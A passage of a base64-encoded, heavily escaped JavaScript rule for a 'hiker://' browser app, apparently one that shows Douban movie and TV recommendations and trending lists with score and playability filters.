mxQYXJhbXMudXJsLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB1cmxQYXJhbXMuZXh0cmEsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBlLnBpYyA/IGUucGljLm5vcm1hbCArIFxcXFxcXFwiQFJlZmVyZXI9XFxcXFxcXCIgKyBlLnBpYy5ub3JtYWwgOiBlLmNvdmVyLnVybCArICdAUmVmZXJlcj0nICsgZS5jb3Zlci51cmwsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogZS5udWxsX3JhdGluZ19yZWFzb24gfHwgZS5yYXRpbmcudmFsdWVcXFxcclxcXFxuICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgfSkpO1xcXFxyXFxcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoJ3JlY29tbWVuZGF0aW9ucycsIGlbMl0pO1xcXFxyXFxcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoJ3JlY29tbWVuZGF0aW9ucycsIGlbMV0pO1xcXFxyXFxcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoJ3JlY29tbWVuZGF0aW9ucycsIGlbMF0pO1xcXFxyXFxcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoJ3JlY29tbWVuZGF0aW9ucycsIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnTxiaWc+PHN0cm9uZz7nm7jlhbPmjqjojZA8L3N0cm9uZz48L2JpZz5cXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8jbm9IaXN0b3J5IycpLnJ1bGUoKHQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVjb21tZW5kYXRpb25zKHRbMF0sIHRbMV0pO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSwgW29iai50eXBlLCBvYmouaWRdKSxcXFxcclxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oJ3JlY29tbWVuZGF0aW9ucycse2NvbF90eXBlOiAnbGluZScsZXh0cmE6e2lkOidub29vcCd9fSlcXFxcclxcXFxuICAgICAgICB9LFxcXFxyXFxcXG4gICAgICAgIHBhcmFtOiB7XFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXFxcXFwiICsgdHlwZSArIFxcXFxcXFwiL1xcXFxcXFwiICsgaWQgKyBcXFxcXFxcIi9yZWNvbW1lbmRhdGlvbnNcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgdHlwZTogdHlwZSxcXFxcclxcXFxuICAgICAgICAgICAgaWQ6IGlkXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgfV0pXFxcXHJcXFxcbn1cXFxcclxcXFxuXFxcXHJcXFxcbi8v5o6o6I2QXFxcXHJcXFxcbmZ1bmN0aW9uIGZpbmRMaXN0KHBhZ2UsIGNvdW50KSB7XFxcXHJcXFxcbiAgICBpZiAoIWdldE15VmFyKCdmaW5kTGlzdCcpKSBwdXRNeVZhcignZmluZExpc3QnLCAne1xcXFxcXFwiaXRlbVxcXFxcXFwiOlxcXFxcXFwibW92aWVcXFxcXFxcIixcXFxcXFxcInBsYXlhYmxlXFxcXFxcXCI6XFxcXFxcXCIwXFxcXFxcXCIsXFxcXFxcXCJzY29yZVxcXFxcXFwiOlxcXFxcXFwiMCwxMFxcXFxcXFwifScpO1xcXFxyXFxcXG4gICAgbGV0IGEgPSBbXTtcXFxcclxcXFxuICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignZmluZExpc3QnKSk7XFxcXHJcXFxcbiAgICBsZXQgY29sb3IgPSBnZXRDb25maWcoJ2Nob29zZUNvbG9yJyk7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGl0ZW1zID0ge1xcXFxyXFxcXG4gICAgICAgIOeUteW9sTogJ21vdmllJyxcXFxcclxcXFxuICAgICAgICDnlLXop4bliac6ICd0didcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIGZvciAoaSBpbiBpdGVtcykge1xcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLml0ZW0gPT09IGl0ZW1zW2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdmaW5kTGlzdCcpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRlbXAuaXRlbSA9IGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImZpbmRMaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgIH0sIGl0ZW1zW2ldKVxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICBjb2xfdHlwZTogJ2JsYW5rX2Jsb2NrJ1xcXFxyXFxcXG4gICAgfSlcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgcGxheWFibGUgPSB7XFxcXHJcXFxcbiAgICAgICAg5YWo6YOo5b2x54mHOiAnMCcsXFxcXHJcXFxcbiAgICAgICAg5LuF5pyJ54mH5rqQOiAnMSdcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIGZvciAobGV0IHIgaW4gcGxheWFibGUpIHtcXFxcclxcXFxuICAgICAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogdGVtcC5wbGF5YWJsZSA9PSBwbGF5YWJsZVtyXSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgciArICcgPC9mb250PjwvYj4nIDogcixcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjogLy9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignZmluZExpc3QnKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0ZW1wLnBsYXlhYmxlID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiZmluZExpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgfSwgcGxheWFibGVbcl0pXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+6K+E5YiG5Yy66Ze0OicgKyB0ZW1wLnNjb3JlLnJlcGxhY2UoJywnLCAnLScpICsgJyA8L2ZvbnQ+PC9iPicsXFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICB1cmw6ICQodGVtcC5zY29yZS5yZXBsYWNlKCcsJywgJy0nKSwgJ+ivhOWIhuW6lOWcqDAtMTDkuYvpl7QnKS5pbnB1dCgoKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignZmluZExpc3QnKSk7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCBpbnB1dHMgPSBpbnB1dC5zcGxpdCgnLScpO1xcXFxyXFxcXG4gICAgICAgICAgICBpZiAoaW5wdXRzLmxlbmd0aCA9PSAyICYmIGlucHV0cy5ldmVyeShlID0+IGUgPj0gMCAmJiBlIDw9IDEwKSAmJiBwYXJzZUZsb2F0KGlucHV0c1swXSkgPCBpbnB1dHNbMV0pIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRlbXAuc2NvcmUgPSBpbnB1dC5yZXBsYWNlKCctJywgJywnKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiZmluZExpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfSlcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgcyA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0ZW1wLml0ZW0gKyBcXFxcXFxcIi9yZWNvbW1lbmRcXFxcXFxcIiArICc/cGxheWFibGU9JyArIHRlbXAucGxheWFibGUgKyAnJnNjb3JlX3JhbmdlPScgKyB0ZW1wLnNjb3JlICsgKHBhZ2UgPyBcXFxcXFxcIiZzdGFydD1cXFxcXFxcIiArIChwYWdlIC0gMSkgKiBjb3VudCArIFxcXFxcXFwiJmNvdW50PVxcXFxcXFwiICsgY291bnQgOiBcXFxcXFxcIiZzdGFydD0wJmNvdW50PThcXFxcXFxcIikpO1xcXFxyXFxcXG4gICAgbGV0IGwgPSBzLml0ZW1zO1xcXFxyXFxcXG4gICAgbCA9IGwuZmlsdGVyKGUgPT4gZS50eXBlICE9PSBcXFxcXFxcImFkXFxcXFxcXCIgJiYgZS50eXBlICE9PSBcXFxcXFxcInRhZ3NcXFxcXFxcIik7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGRldGFpbHNWaWV3Q29uZmlncyA9IGdldENvbmZpZygnZGV0YWlsc1ZpZXdDb25maWdzJyk7XFxcXHJcXFxcbiAgICBsZXQgaSA9IGwubWFwKChlID0+IHtcXFxcclxcXFxuICAgICAgICBsZXQgdHlwZSA9IGUudHlwZSxcXFxcclxcXFxuICAgICAgICAgICAgaWQgPSBlLmlkLFxcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZSA9IGUuc3VidGl0bGUgfHwgZS50aXRsZTtcXFxcclxcXFxuICAgICAgICBsZXQgYmFzZVVybCA9IGUudHlwZSA9PT0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiID8gJ2hpa2VyOi8vZW1wdHkvJHBhZ2V7ZnlwYWdlfScgOiAnaGlrZXI6Ly9lbXB0eSNpbW1lcnNpdmVUaGVtZSMnO1xcXFxyXFxcXG4gICAgICAgIGxldCB1c2VDb25maWcgPSBkZXRhaWxzVmlld0NvbmZpZ3NbZGV0YWlsc1ZpZXdDb25maWdzLnVzZV0uY29uZmlnO1xcXFxyXFxcXG4gICAgICAgIGxldCB1cmxQYXJhbXMgPSB7fTtcXFxcclxcXFxuICAgICAgICBpZiAodXNlQ29uZmlnLnN0YXJ0c1dpdGgoJ3snKSkge1xcXFxyXFxcXG4gICAgICAgICAgICBldmFsKCd1cmxQYXJhbXMgPSAnICsgdXNlQ29uZmlnKTtcXFxcclxcXFxuICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICB1cmxQYXJhbXMudXJsID0gJChiYXNlVXJsICsgXFxcXFxcXCIjbm9IaXN0b3J5I1xcXFxcXFwiICsgJz90eXBlPScgKyB0eXBlICsgJyZpZD0nICsgaWQpLnJ1bGUoKHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKTtcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgcmV0dXJuIHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlICsgKHR5cGUgPT09IFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIiA/IFxcXFxcXFwiXFxcXFxcXCIgOiBcXFxcXFxcIu+8iFxcXFxcXFwiICsgZS55ZWFyICsgXFxcXFxcXCLvvIlcXFxcXFxcIiksXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXFxcclxcXFxuICAgICAgICAgICAgZXh0cmE6IHVybFBhcmFtcy5leHRyYSxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiBlLnBpYyA/IGUucGljLm5vcm1hbCArIFxcXFxcXFwiQFJlZmVyZXI9XFxcXFxcXCIgKyBlLnBpYy5ub3JtYWwgOiBlLmNvdmVyX3VybCArIFxcXFxcXFwiQFJlZmVyZXI9XFxcXFxcXCIgKyBlLmNvdmVyX3VybCxcXFxcclxcXFxuICAgICAgICAgICAgZGVzYzogZS50eXBlICE9PSBcXFxcXFxcInBsYXlsaXN0XFxcXFxcXCIgPyAoZS50YWdzLm1hcCgoZSA9PiBlLm5hbWUpKS5qb2luKFxcXFxcXFwiLFxcXFxcXFwiKSArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIgKyAoZS5yYXRpbmcgPyBjb21wdXRlUmF0aW5nKGUucmF0aW5nLm1heCwgZS5yYXRpbmcudmFsdWUpICsgXFxcXFxcXCIgXFxcXFxcXCIgKyBlLnJhdGluZy52YWx1ZS50b0ZpeGVkKDEpICsgXFxcXFxcXCLliIZcXFxcXFxcIiA6IFxcXFxcXFwi5pqC5peg6K+E5YiGXFxcXFxcXCIpKSA6IChlLnRpdGxlICsgXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIiArIGUudGFncy5qb2luKFxcXFxcXFwiLFxcXFxcXFwiKSArIFxcXFxcXFwiXFxcXFxcXFxu5YWxXFxcXFxcXCIgKyBlLml0ZW1zX2NvdW50ICsgXFxcXFxcXCLpg6hcXFxcXFxcIilcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9KSk7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgcmV0dXJuIHBhZ2UgPiAxID8gaSA6IGEuY29uY2F0KGkpO1xcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+eDremXqFxcXFxyXFxcXG5mdW5jdGlvbiBob3RMaXN0KHBhZ2UsIGNvdW50KSB7XFxcXHJcXFxcbiAgICBpZiAoIWdldE15VmFyKCdob3RMaXN0JykpIHB1dE15VmFyKCdob3RMaXN0JywgJ3tcXFxcXFxcIml0ZW1cXFxcXFxcIjpcXFxcXFxcIm1vdmllX3Nob3dpbmc/YXJlYT3lhajpg6hcXFxcXFxcIixcXFxcXFxcInBsYXlhYmxlXFxcXFxcXCI6XFxcXFxcXCIwXFxcXFxcXCIsXFxcXFxcXCJzb3J0XFxcXFxcXCI6XFxcXFxcXCJyZWNvbW1lbmRcXFxcXFxcIixcXFxcXFxcInNjb3JlXFxcXFxcXCI6XFxcXFxcXCIwLDEwXFxcXFxcXCJ9Jyk7XFxcXHJcXFxcbiAgICBsZXQgYSA9IFtdO1xcXFxyXFxcXG4gICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdob3RMaXN0JykpO1xcXFxyXFxcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBpdGVtcyA9IHtcXFxcclxcXFxuICAgICAgICDnlLXlvbE6IHtcXFxcclxcXFxuICAgICAgICAgICAg5b2x6Zmi54Ot5pig55S15b2xOiAnbW92aWVfc2hvd2luZz9hcmVhPeWFqOmDqCcsXFxcXHJcXFxcbiAgICAgICAgICAgIOixhueTo+eDremXqOeUteW9sTogJ2hvdF9nYWlhP2FyZWE95YWo6YOoJyxcXFxcclxcXFxuICAgICAgICAgICAg54Ot6Zeo5Y2O6K+t55S15b2xOiAnaG90X2dhaWE/YXJlYT3ljY7or60nLFxcXFxyXFxcXG4gICAgICAgICAgICDng63pl6jmrKfnvo7nlLXlvbE6ICdob3RfZ2FpYT9hcmVhPeasp+e+jicsXFxcXHJcXFxcbiAgICAgICAgICAgIOeDremXqOmfqeWbveeUteW9sTogJ2hvdF9nYWlhP2FyZWE96Z+p5Zu9JyxcXFxcclxcXFxuICAgICAgICAgICAg54Ot6Zeo5pel5pys55S15b2xOiAnaG90X2dhaWE/YXJlYT3ml6XmnKwnXFxcXHJcXFxcbiAgICAgICAgfSxcXFxcclxcXFxuICAgICAgICDnlLXop4bliac6IHtcXFxcclxcXFxuICAgICAgICAgICAg54Ot5pKt55S16KeG5YmnOiAndHZfaG90JyxcXFxcclxcXFxuICAgICAgICAgICAg54Ot5pKt5Zu95Lqn5YmnOiAndHZfZG9tZXN0aWMnLFxcXFxyXFxcXG4gICAgICAgICAgICDng63mkq3mrKfnvo7liac6ICd0dl9hbWVyaWNhbicsXFxcXHJcXFxcbiAgICAgICAgICAgIOeDreaSreaXpeWJpzogJ3R2X2phcGFuZXNlJyxcXFxcclxcXFxuICAgICAgICAgICAg54Ot5pKt6Z+p5YmnOiAndHZfa29yZWFuJyxcXFxcclxcXFxuICAgICAgICAgICAg54Ot5pKt5Yqo55S7OiAndHZfYW5pbWF0aW9uJ1xcXFxyXFxcXG4gICAgICAgIH0sXFxcXHJcXFxcbiAgICAgICAg57u86Im6OiB7XFxcXHJcXFxcbiAgICAgICAgICAgIOeDreaSree7vOiJujogJ3Nob3dfaG90JyxcXFxcclxcXFxuICAgICAgICAgICAg5Zu95YaF57u86Im6OiAnc2hvd19kb21lc3RpYycsXFxcXHJcXFxcbiAgICAgICAgICAgIOWbveWklue7vOiJujogJ3Nob3dfZm9yZWlnbidcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBmb3IgKGxldCBpIGluIGl0ZW1zKSB7XFxcXHJcXFxcbiAgICAgICAgZm9yIChsZXQgaiBpbiBpdGVtc1tpXSkge1xcXFxyXFxcXG4gICAgICAgICAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRlbXAuaXRlbSA9PSBpdGVtc1tpXVtqXSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgaiArICcgPC9mb250PjwvYj4nIDogaixcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdob3RMaXN0JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHRlbXAuaXRlbSA9IGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ2hvdExpc3QnLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9LCBpdGVtc1tpXVtqXSlcXFxcclxcXFxuICAgICAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IHNvcnQgPSB7XFxcXHJcXFxcbiAgICAgICAg54Ot5bqm5o6S5bqPOiAncmVjb21tZW5kJyxcXFxcclxcXFxuICAgICAgICDml7bpl7TmjpLluo86ICd0aW1lJyxcXFxcclxcXFxuICAgICAgICDor4TliIbmjpLluo86ICdyYW5rJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgZm9yIChsZXQgciBpbiBzb3J0KSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAuc29ydCA9PSBzb3J0W3JdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyByICsgJyA8L2ZvbnQ+PC9iPicgOiByLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdob3RMaXN0JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5zb3J0ID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiaG90TGlzdFxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxyXFxcXG4gICAgICAgICAgICB9LCBzb3J0W3JdKVxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJibGFua19ibG9ja1xcXFxcXFwiXFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBwbGF5YWJsZSA9IHtcXFxcclxcXFxuICAgICAgICDlhajpg6jlvbHniYc6ICcwJyxcXFxcclxcXFxuICAgICAgICDku4XmnInniYfmupA6ICcxJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgZm9yIChsZXQgciBpbiBwbGF5YWJsZSkge1xcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnBsYXlhYmxlID09IHBsYXlhYmxlW3JdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyByICsgJyA8L2ZvbnQ+PC9iPicgOiByLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdob3RMaXN0JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5wbGF5YWJsZSA9IGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImhvdExpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgfSwgcGxheWFibGVbcl0pXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+6K+E5YiG5Yy66Ze0OicgKyB0ZW1wLnNjb3JlLnJlcGxhY2UoJywnLCAnLScpICsgJyA8L2ZvbnQ+PC9iPicsXFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICB1cmw6ICQodGVtcC5zY29yZS5yZXBsYWNlKCcsJywgJy0nKSwgJ+ivhOWIhuW6lOWcqDAtMTDkuYvpl7QnKS5pbnB1dCgoKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignaG90TGlzdCcpKTtcXFxcclxcXFxuICAgICAgICAgICAgbGV0IGlucHV0cyA9IGlucHV0LnNwbGl0KCctJyk7XFxcXHJcXFxcbiAgICAgICAgICAgIGlmIChpbnB1dHMubGVuZ3RoID09IDIgJiYgaW5wdXRzLmV2ZXJ5KGUgPT4gZSA+PSAwICYmIGUgPD0gMTApICYmIHBhcnNlRmxvYXQoaW5wdXRzWzBdKSA8IGlucHV0c1sxXSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5zY29yZSA9IGlucHV0LnJlcGxhY2UoJy0nLCAnLCcpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJob3RMaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35q2j56Gu6L6T5YWlJ1xcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGwgPSBbXTtcXFxcclxcXFxuICAgIGlmICh0ZW1wLml0ZW0uaW5kZXhPZignPycpICE9IC0xKSB7XFxcXHJcXFxcbiAgICAgICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2R